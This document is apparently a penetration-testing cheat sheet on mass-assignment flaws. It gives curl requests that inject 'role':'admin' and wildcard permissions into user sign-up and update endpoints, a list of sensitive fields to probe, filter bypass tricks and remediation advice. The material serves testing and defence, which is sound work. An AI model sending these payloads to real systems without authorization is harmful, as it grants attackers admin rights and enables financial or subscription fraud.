# Mass Assignment

## Summary
Modify object properties not intended to be user-controlled during creation/update.

## Detection

### Registration Endpoints
```bash
# Test role escalation on sign-up
curl -X POST https://target.com/api/Users \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@test.com","password":"Test123!","role":"admin","isActive":true}'

# Check if response shows role=admin
```

### Update Endpoints
```bash
# Add admin fields to PUT/PATCH requests
curl -X PATCH https://target.com/api/Users/me \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","permissions":"*"}'
```

## Common Fields to Test

| Field | Purpose |
|-------|---------|
| `role`, `roles` | Privilege escalation |
| `is_admin`, `isActive` | Boolean bypass |
| `permissions`, `scope` | Authorization scope |
| `balance`, `credit`, `price` | Financial manipulation |
| `deluxeToken`, `membership` | Subscription bypass |
| `verified`, `email_verified` | Verification bypass |
| `__proto__` | Prototype pollution |

## Practical Example (Real finding)

```bash
# Register with elevated role
curl -X POST "https://target.com/api/Users" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@hack.com","password":"Str0ngPass!","role":"admin"}'

# Response
{"status":"success","data":{"role":"admin","id":51,...}}
# → Mass Assignment CONFIRMED
```

## Bypass Techniques
- Use different casing: `Role`, `ROLE`  
- Use nested objects: `{"user":{"role":"admin"}}`
- Try array/object syntax: `roles[]=admin`
- GraphQL: request `role` field in mutation
- Add via different Content-Type: `application/xml`

## Remediation
- Use DTOs/whitelists for mass assignment
- Never auto-bind request body to database models
- Validate roles server-side, not from input
